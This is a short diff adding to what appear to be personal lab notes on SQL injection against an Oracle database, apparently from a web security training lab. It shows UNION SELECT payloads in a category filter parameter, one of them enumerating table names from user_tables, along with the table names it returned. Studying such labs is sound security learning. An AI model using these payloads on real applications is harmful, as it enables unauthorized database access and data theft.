@@ -111,4 +111,7 @@ ANS : GET /filter?category=Gifts'--+
        ' union select 'ABC','DEF' from dual --+
 
 
-      
+      -find table name from Oracle DB 
+
+      'union SELECT table_name,'ABC' FROM user_tables --+  : USERS_BYFICP ,PRODUCTS
+
